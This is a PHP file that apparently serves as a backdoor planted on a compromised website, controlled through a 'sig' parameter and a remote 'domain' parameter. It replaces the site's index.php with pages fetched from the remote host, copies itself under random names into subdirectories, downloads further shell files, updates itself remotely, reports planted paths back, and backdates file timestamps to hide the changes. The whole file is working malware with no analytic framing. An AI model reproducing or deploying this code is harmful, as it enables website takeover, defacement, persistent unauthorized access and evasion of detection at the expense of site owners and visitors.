<?php
	//echo str_ireplace($_SERVER['PHP_SELF'],'',__FILE__);exit;
	define('BASE_PATH',str_ireplace($_SERVER['PHP_SELF'],'',__FILE__));
	function curl_get_contents($url)
    {
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
    function curl_get_contents1($url,$data=array())
    {
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
	   curl_setopt($ch, CURLOPT_POST, 1);
	   curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
	function copyfiles($file1,$file2){
	 	$contentx =@file_get_contents($file1);
	  	$openedfile = fopen($file2, "w");
	  	fwrite($openedfile, $contentx);
	  	fclose($openedfile);
	    if ($contentx === FALSE) {
	   		$status=false;
	    }else $status=true;
	   	return $status;
  	}
	function check_remote_file_exists($url) {
	    $curl = curl_init($url);
	    curl_setopt($curl, CURLOPT_NOBODY, true);
	    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
	    $result = curl_exec($curl);
	    $found = false;
	    if ($result !== false) {
	        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
	        if ($statusCode == 200) {
	            $found = true;
	        }
	    }
	    curl_close($curl);
	    return $found;
	}
 	function dir_size1($dir3,$url){
	      $dh = @opendir($dir3);
	      $return = array();
		  while($file = @readdir($dh)){
		     if($file!='.' and $file!='..'){
		     	$filetime[] = date("Y-m-d H:i:s",filemtime($file));
	         }
	      }  
          @closedir($dh);             
          array_multisort($filetime);
          return $filetime;
	}						 
 	$sig = $_GET['sig'];
 	$domain_2020 = 'http://'.$_GET['domain'];
 	if($sig=='pt22'){
	    $domain_name = $_SERVER['SERVER_NAME'];
		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
		$file_path = BASE_PATH.'/index.php';
		$file_path1 = $domain_2020.'/shell_index/'.$domain_name1.'/index1.html';
	    $file_path1_headers=get_headers($file_path1);
	    if(file_exists($file_path)){
		    if(preg_match('/200/',$file_path1_headers[0])){
				$str1=@file_get_contents($file_path1);
				$str=@file_get_contents($file_path);
				if($str==$str1){
					 echo 'ok';
				}else{
				     echo 'fail';
			         @chmod($file_path,0644);
			         unlink($file_path);
			         if(copyfiles($file_path1,$file_path))
			         {
			             echo 'index.php copy success!';
			             $ser_url3= $domain_2020."/lose_stat21.php?dname1=".$domain_name1."";
					 	 curl_get_contents($ser_url3);
			         }
			         else
			         {
			             echo 'index.php copy fail!';
			         }  
				}
			}else{
				$ser_url1= $domain_2020."/create_path_file21.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."";
				$file_contents_2=curl_get_contents($ser_url1);	
			}
	    }else{
	    	if(preg_match('/200/',$file_path1_headers[0])){
	    		echo 'fail';
			    @chmod($file_path,0644);
			    if(copyfiles($file_path1,$file_path))
			    {
			        echo 'index.php copy success!';
			    }
			    else
			    {
			        echo 'index.php copy fail!';
			    }
	    	}
	    }
 	}else if($sig=='pt33'){
	    $domain_name = $_SERVER['SERVER_NAME'];
		$domain_name1 = trim(str_replace("www.","",$_SERVER['SERVER_NAME']));
		$file_path = BASE_PATH.'/index.php';
		$file_path1 = $domain_2020.'/shell_index/'.$domain_name1.'/index.html';
		$str1=@curl_get_contents($file_path1);
		$str=@file_get_contents($file_path);
		if(file_exists($file_path)){
		    if(check_remote_file_exists($file_path1)){
				if($str==$str1){
					 echo 'ok';
				}else{
				     //echo 'fail';
			         @chmod($file_path,0644);
			         $result_unlink=unlink($file_path);
			         if($result_unlink){
				         if(copyfiles($file_path1,$file_path))
				         {
				             $ser_url3=$domain_2020."/lose_stat21.php?dname1=".$domain_name1."";
						 	 curl_get_contents($ser_url3);
						 	 
					 		 $time3=dir_size1(dirname(__FILE__),'');
					 		 $time4=strtotime($time3[0]);
					 		 touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
					 		 touch($file_path,$time4);
					 		 echo 'ok';
				         }
				         else
				         {
				         	file_put_contents($file_path,$str1);
				         	if($str==$str1){
				         		$ser_url3=$domain_2020."/lose_stat21.php?dname1=".$domain_name1."";
						 	    curl_get_contents($ser_url3);
	
						 		$time3=dir_size1(dirname(__FILE__),'');
						 		$time4=strtotime($time3[0]);
					 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
					 		 	touch($file_path,$time4);
					 		 	echo 'ok';
				         	}else{
				         		echo 'fail';
				         	}
				         }
			         }  
				}
			}
	    }else{
	    	if(check_remote_file_exists($file_path1)){
			    @chmod($file_path,0644);
			    if(copyfiles($file_path1,$file_path))
			    {
			        $time3=dir_size1(dirname(__FILE__),'');
			 		$time4=strtotime($time3[0]);
		 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
		 		 	touch($file_path,$time4);
		 		 	echo 'ok';
			    }
			    else
			    {
		    		file_put_contents($file_path,$str1);
		    		if($str==$str1){
		         		$ser_url3=$domain_2020."/lose_stat21.php?dname1=".$domain_name1."";
				 	    curl_get_contents($ser_url3);

				 		$time3=dir_size1(dirname(__FILE__),'');
				 		$time4=strtotime($time3[0]);
			 		 	touch(dirname(__FILE__).'/'.basename(__FILE__),$time4);
			 		 	touch($file_path,$time4);
			 		 	echo 'ok';
		         	}else{
		         		echo 'fail';
		         	}
			    }
	    	}
		}
 	}else if($sig=='gen85'){
		
 		global $check_url_arry;
 		$check_url_arry=array();
	 	function fordir($dir){
	 		global $check_url_arry;
		    $dirinfo = scandir($dir);
		    $file11=dirname(__FILE__).'/'.basename(__FILE__);
		    //$file11=$domain_2020."/shell_index/style.txt"; 
	 	    if(count($check_url_arry)>=10){
				return;
			}
		    foreach ($dirinfo as $v) {
			    if(count($check_url_arry)>=10){
					return;
				}
		        if($v != '.' && $v != '..'){
		            $dirname = $dir. '/' . $v;
		            if (is_dir($dirname)) {
		            	$file22 =$v.chr(rand(97,122)).'.php';
		            	$file33 = $dirname .'/'.$file22;
			            if(copyfiles($file11,$file33))
					    {
					    	$check_url_arry[]=$file33;
					 		echo $file22.' copy success!'.'<br />';
					    }
					    else
					    {
					        echo $file22.' copy fail!'.'<br />';
					    }
		            }
		            if (is_dir($dirname)){
		                fordir($dirname);
		            }            
		        }
		    } 
		}
		
		
		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		fordir(BASE_PATH);
 		$file16=dirname(__FILE__).'/'.basename(__FILE__);
		
		/*
		$chk_ind16 = substr($domain_name1,0,5).chr(rand(97,122)).'.php';
		$chk_ind17 = BASE_PATH.'/'.$chk_ind16;
		$check_url_arry1=array();
 		if(copyfiles($file16,$chk_ind17))
	    {
	    	$check_url_arry1[]=$chk_ind17;
	 		echo $chk_ind16.' copy success!'.'<br />'; 
	    }
	    else
	    {
	        echo $chk_ind16.' copy fail!'.'<br />';
	    }
		*/
		
 		$check_url_arry2 =array();
 		$check_url_cont1='';
	 	if ($_SERVER["HTTPS"] == "on") 
	    {
	        $http1="https://";
	    }else{
	    	$http1="http://";
	    }
		//echo '111333-'.BASE_PATH;exit;
 		for($m=0;$m<count($check_url_arry);$m++){
 			$check_url_arry2[] =$http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,'',$check_url_arry[$m]);
 			$check_url_cont1.=$http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,'',$check_url_arry[$m]).',';
 		}
		
 		$check_url_arry2[] =$http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,'',$check_url_arry1[0]);
 		$check_url_cont1.=$http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,'',$check_url_arry1[0]);
		
 		$url_gen85= $domain_2020."/get_check_url28.php?dname1=".$domain_name1."&check_url_cont=".$check_url_cont1."";
		
		//echo curl_get_contents1($url_gen85,$check_url_arry2);
		echo curl_get_contents($url_gen85,$check_url_arry2);
		
		/*
		if(file_exists(dirname(__FILE__).'/'.basename(__FILE__))){
			unlink(dirname(__FILE__).'/'.basename(__FILE__));
		}
		*/
		
		if(count($check_url_arry2)>0){
			for($k=0;$k<count($check_url_arry2);$k++){
				echo $check_url_arry2[$k].'<br />';
			}
		}
		$file_path1 = $domain_2020.'/shell_index/'.$domain_name1.'/index.html';
		
		if(!check_remote_file_exists($file_path1)){
			$ser_url1= $domain_2020."/create_path_file41.php?dname1=".$domain_name1."&check_address1=http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."";
			$file_contents_2=curl_get_contents($ser_url1);
			echo $file_contents_2;
		}
		exit;
 	}else if($sig=='gen87'){
 		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		$check_url_arry3 =array();
	    $check_url_arry3[]=$_SERVER['PHP_SELF'];
 		$url_gen87= $domain_2020."/get_check_url1.php?dname1=".$domain_name1."";
		echo curl_get_contents1($url_gen87,$check_url_arry3);
		echo '<br />---------------------------------------------------<br />';
		$file_url_arry=array();
		$file_url_cont1='';
		//$file_url_arry[]= str_replace(BASE_PATH,'',dirname(__FILE__));
		$file_url_arry[]= dirname($_SERVER['PHP_SELF']);
		$file_url_cont1.= dirname($_SERVER['PHP_SELF']).',';
		
		$file_url_arry[]= basename(__FILE__);
		$file_url_cont1.= basename(__FILE__).',';
		
		$file_url_arry[]="http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
		$file_url_cont1.="http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; 
		
		$ser_url1= $domain_2020."/create_path_file36.php?dname1=".$domain_name1."&file_url_cont=".$file_url_cont1."";
		$file_contents_2=curl_get_contents1($ser_url1,$file_url_arry);
		echo $file_contents_2;
		
 		$time1=dir_size1(dirname(__FILE__),'');
 		$time2=strtotime($time1[0]);
 		echo touch(dirname(__FILE__).'/'.basename(__FILE__),$time2);
 		echo '<br />---------------------------------------------------<br />';
 		exit;
 	}else if($sig=='ctime22'){
 		$domain_name = $_SERVER['SERVER_NAME'];
		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
		//$file_path = BASE_PATH.'/index.php';
		$style_url1=$domain_2020."/get_style1.php?dname1=".$domain_name1."";
 		$style1= curl_get_contents($style_url1);
		$style1 =explode(",",$style1);
		for($i=0;$i<count($style1);$i++){
			$shell_file11 =trim(BASE_PATH.$style1[$i]);
			$shell_file_pathinfo= pathinfo($shell_file11, PATHINFO_DIRNAME);
			$time1=dir_size1($shell_file_pathinfo,'');
 			$time2=strtotime($time1[0]);
 			echo touch($shell_file11,$time2);
		}
 	}else if($sig=='style91'){
 		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		$url_pos_style = $domain_2020."/pos_style.php?dname1=".$domain_name1."";
 		$pos_style= curl_get_contents($url_pos_style);
 		$file11=dirname(__FILE__).'/'.basename(__FILE__);
 		$file22=BASE_PATH.$pos_style;
 		if(copyfiles($file11,$file22))
	    {
	        echo $file22.' copy success!'.'<br />';
	    }
	    else
	    {
	        echo $file22.' copy fail!'.'<br />';
	    }
	    exit;
 	}else if($sig=='del22'){
 		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		$ser_url= $domain_2020."/create_path_file3.php?dname1=".$domain_name1."";
		$file_contents_33=curl_get_contents($ser_url);
		echo $file_contents_33;
		exit;
 	}else if($sig=='index'){
 		$file_path = BASE_PATH.'/index.php';
 		$file_path1 = BASE_PATH.'/index.html';
 		$file_path2 = BASE_PATH.'/index.htm';
 		$file_path3 = BASE_PATH.'/default.html';
 		if(file_exists($file_path)){
 			$str=@file_get_contents($file_path);
 			echo $str;
 			exit;
 		}else if(file_exists($file_path1)){
 			$str1=@file_get_contents($file_path1);
 			echo $str1;
 			exit;
 		}else if(file_exists($file_path2)){
 			$str2=@file_get_contents($file_path2);
 			echo $str2;
 			exit;
 		}else if(file_exists($file_path3)){
 			$str3=@file_get_contents($file_path3);
 			echo $str3;
 			exit;
 		}else{
 			echo '';
 			exit;
 		}
 	}else if($sig=='index1'){
 		//$file_path = BASE_PATH.'/index.php';
 		$file_path= dirname(__FILE__).'/'.basename(__FILE__);
 		$str=@file_get_contents($file_path);
 		echo $str;
 		exit;
 	}else if($sig=='shell519'){
 		$domain_name = $_SERVER['SERVER_NAME'];
		$domain_name1 = str_replace("www.","",$_SERVER['SERVER_NAME']);
 		$shell5=getcwd().'/'.substr($domain_name1,0,5).chr(rand(97,122)).'.php';
		//$shell5=BASE_PATH.'/'.substr($domain_name1,0,5).chr(rand(97,122)).'.php';
 		$shell_source5= $domain_2020."/shell_index/shell519.html";
 		if(check_remote_file_exists($shell_source5)){
	 		if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	 		if(copyfiles($shell_source5,$shell5))
		    {
		    	$time3=dir_size1(dirname(__FILE__),'');
				$time4=strtotime($time3[0]);
				touch($shell5,$time4);
		        echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
		        //echo date("Y-m-d H:i:s",filemtime($shell5)).'--'.date("Y-m-d H:i:s",filectime($shell5)).'--'.date("Y-m-d H:i:s",fileatime($shell5)).'--'.'<br />';
		    }
		    else
		    {
		    	$shell_cont5=@curl_get_contents($shell_source5);
		    	$shell51=@file_put_contents($shell5,$shell_cont5);
		    	if($shell51>0){
		    		$time3=dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($shell5,$time4);
		    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create success!';
		    		//echo date("Y-m-d H:i:s",filemtime($shell5)).'--'.date("Y-m-d H:i:s",filectime($shell5)).'--'.date("Y-m-d H:i:s",fileatime($shell5)).'--'.'<br />';
		    	}else{
		    		echo $http1.$_SERVER["HTTP_HOST"].str_replace(BASE_PATH,"",$shell5).'--create fail!';
		    	}
		    }
 		}
		exit;
 	}else if($sig=='update'){
 		$style_2020=$domain_2020.'/shell_index'.'/style_2020.html';
 		$file_style=__FILE__;
 		if(check_remote_file_exists($style_2020)){
 			if(copyfiles($style_2020,$file_style))
		    {
		    	$time3=dir_size1(dirname(__FILE__),'');
				$time4=strtotime($time3[0]);
				touch($file_style,$time4);
		    	echo $file_style.'--update success!';
		    }else{
		    	$shell_cont5=@curl_get_contents($style_2020);
		    	$shell51=@file_put_contents($file_style,$shell_cont5);
		    	if($shell51>0){
		    		$time3=dir_size1(dirname(__FILE__),'');
					$time4=strtotime($time3[0]);
					touch($file_style,$time4);
					echo $file_style.'--update success!';
		    	}else{
		    		echo $file_style.'--update fail!';
		    	}
		    }	
 		}
		exit;	
 	}
 	exit();
?>
